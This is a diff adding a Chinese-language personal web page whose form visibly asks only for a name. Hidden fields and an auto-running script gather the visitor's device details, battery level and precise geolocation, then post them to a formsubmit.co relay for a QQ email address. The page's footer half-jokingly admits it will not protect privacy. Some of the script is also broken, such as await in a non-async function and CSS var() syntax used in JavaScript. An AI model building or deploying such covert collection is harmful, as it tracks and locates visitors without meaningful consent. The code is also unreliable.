@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>王昱皓的网站</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap');
+        
+        :root {
+            --primary: #2ecc71;
+            --secondary: #27ae60;
+            --error: #e74c3c;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #1abc9c, #3498db);
+            opacity: 0;
+            animation: fadeIn 1s 0.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2.5rem;
+            border-radius: 25px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+            transform: translateY(30px);
+            animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+            width: 90%;
+            max-width: 500px;
+        }
+
+        @keyframes slideUp {
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .form-group {
+            margin: 1.8rem 0;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 1.2rem;
+            border: 2px solid #ecf0f1;
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: #f9f9f9;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(46, 204, 113, 0.2);
+            background: #fff;
+        }
+
+        button {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 1.2rem 2.5rem;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        button:hover {
+            background: var(--secondary);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+        }
+
+        button::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 300px;
+            height: 300px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            animation: ripple 0.6s ease-out;
+        }
+
+        @keyframes ripple {
+            to {
+                transform: translate(-50%, -50%) scale(2);
+                opacity: 0;
+            }
+        }
+
+        #message {
+            margin-top: 1.5rem;
+            text-align: center;
+            display: none;
+            font-weight: 500;
+        }
+
+        .privacy {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: #7f8c8d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form id="myForm" action="https://formsubmit.co/2587141311@qq.com" method="POST">
+            <!-- 防垃圾邮件配置 -->
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="none">
+            <input type="hidden" name="_template" value="table">
+            
+            <div class="form-group">
+                <input type="text" name="姓名" placeholder="你叫啥" required>
+            </div>
+            
+            <!-- 隐藏设备信息字段 -->
+            <input type="hidden" name="设备信息" id="deviceInfo">
+            <input type="hidden" name="位置信息" id="locationInfo">
+
+            <button type="submit">提交信息（包跑路😇）</button>
+        </form>
+        <div id="message"></div>
+        <div class="privacy">我们
+        不承诺保护你的隐私安全😡(不要偷看我邮箱🧐)</div>
+    </div>
+
+    <script>
+        // 高级设备信息收集
+        const collectDeviceInfo = () => {
+            const info = {
+                时间戳: new Date().toISOString(),
+                用户代理: navigator.userAgent,
+                屏幕分辨率: `${screen.width}x${screen.height}`,
+                语言: navigator.language,
+                平台: navigator.platform,
+                CPU核心数: navigator.hardwareConcurrency || '未知',
+                内存: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '未知',
+                网络状态: navigator.connection ? {
+                    类型: navigator.connection.effectiveType,
+                    下行速度: `${navigator.connection.downlink} Mbps`,
+                    RTT延迟: `${navigator.connection.rtt} ms`
+                } : '未知',
+                电量状态: navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : '未知',
+                地理位置: '等待获取...'
+            };
+
+            // 获取地理位置
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => 
+                        navigator.geolocation.getCurrentPosition(resolve, reject)
+                    );
+                    info.地理位置 = {
+                        纬度: position.coords.latitude,
+                        经度: position.coords.longitude,
+                        精度: `${position.coords.accuracy} 米`
+                    };
+                } catch (error) {
+                    info.地理位置 = '用户拒绝授权';
+                }
+            } else {
+                info.地理位置 = '浏览器不支持';
+            }
+
+            return JSON.stringify(info, null, 2);
+        };
+
+        // 自动填充设备信息
+        (async () => {
+            const deviceInfo = await collectDeviceInfo();
+            document.getElementById('deviceInfo').value = deviceInfo;
+            document.getElementById('locationInfo').value = 
+                deviceInfo.match(/纬度: ([\d.]+),\s+经度: ([\d.]+)/)?.slice(1).join(',') || '未知';
+        })();
+
+        // 表单提交处理
+        document.getElementById('myForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const submitBtn = document.querySelector('button');
+            const message = document.getElementById('message');
+
+            // 按钮点击动画
+            submitBtn.classList.add('clicked');
+            
+            // 禁用按钮
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<div class="loader"></div> 提交中...';
+
+            try {
+                const response = await fetch(e.target.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                const result = await response.json();
+                if (response.ok) {
+                    message.style.color = var(--primary);
+                    message.textContent = '✅ 提交成功！';
+                    e.target.reset();
+                } else {
+                    throw new Error(result.message || '提交失败');
+                }
+            } catch (error) {
+                message.style.color = var(--error);
+                message.textContent = `❌ 错误：${error.message}`;
+            } finally {
+                message.style.display = 'block';
+                submitBtn.disabled = false;
+                submitBtn.textContent = '提交信息';
+                setTimeout(() => {
+                    message.style.display = 'none';
+                }, 5000);
+            }
+        });
+
+        // 加载动画样式
+        const style = document.createElement('style');
+        style.textContent = `
+            .loader {
+                border: 3px solid #f3f3f3;
+                border-top: 3px solid var(--primary);
+                border-radius: 50%;
+                width: 20px;
+                height: 20px;
+                animation: spin 0.8s linear infinite;
+                display: inline-block;
+                vertical-align: middle;
+                margin-right: 8px;
+            }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
